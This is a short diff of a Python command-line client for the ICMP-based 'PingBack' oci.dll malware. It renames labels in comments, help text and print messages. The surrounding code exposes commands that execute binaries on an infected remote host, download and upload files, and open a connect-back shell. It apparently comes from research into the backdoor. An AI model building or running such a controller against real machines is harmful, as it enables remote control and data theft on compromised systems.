@@ -1,4 +1,4 @@
-# oci.dll malware client using icmp packets for its comms protocol
+# PingBack oci.dll malware client using icmp packets for its comms protocol
 # Lloyd Macrohon <jl.macrohon@gmail.com>
 
 import socket
@@ -226,11 +226,11 @@ class OciClient:
                     print('Protocol error: %s' % e)
 
     def stop(self):
-        print("Stopping oci client...")
+        print("Stopping pingback client...")
         self.stopping = True
         self.sniffer_stop_event.set()
         self.sniffer.join()
-        print("Successfully stopped oci client.")
+        print("Successfully stopped pingback client.")
 
     def __get_local_address(self):
         """ returns the address of interface this gets routed through for remote address """
@@ -277,7 +277,7 @@ def cli():
     pass
 
 @click.command()
-@click.option("--host", required=True, help="remote host with oci.dll malware")
+@click.option("--host", required=True, help="remote host with pingback oci.dll malware")
 @click.option("--bin", required=True, help="command to execute")
 def exep(host, bin):
     """ Execute binary on remote host """
@@ -287,7 +287,7 @@ def exep(host, bin):
 
 
 @click.command()
-@click.option("--host", required=True, help="remote host with oci.dll malware")
+@click.option("--host", required=True, help="remote host with pingback oci.dll malware")
 @click.option("--remote_file", required=True, help="remote file to download")
 @click.option("--local_file", required=True, help="name of output file")
 def download(host, remote_file, local_file):
@@ -303,7 +303,7 @@ def download(host, remote_file, local_file):
 
 
 @click.command()
-@click.option("--host", required=True, help="remote host with oci.dll malware")
+@click.option("--host", required=True, help="remote host with pingback oci.dll malware")
 @click.option("--remote_file", required=True, help="remote file to download")
 @click.option("--local_file", required=True, help="name of output file")
 def download3(host, remote_file, local_file):
@@ -324,7 +324,7 @@ def download3(host, remote_file, local_file):
 
 
 @click.command()
-@click.option("--host", required=True, help="remote host with oci.dll malware")
+@click.option("--host", required=True, help="remote host with pingback oci.dll malware")
 @click.option("--local_file", required=True, help="file to upload")
 @click.option("--remote_file", required=False, help="name of file on remote host")
 @click.option("--port", required=True, type=int, help="port remote host should listen on")
@@ -344,7 +344,7 @@ def upload2(host, local_file, port, remote_file=None):
 
 
 @click.command()
-@click.option("--host", required=True, help="remote host with oci.dll malware")
+@click.option("--host", required=True, help="remote host with pingback oci.dll malware")
 def shell(host):
     """
     Run shell on remote host, this will tell the remote to connect back to us on a random
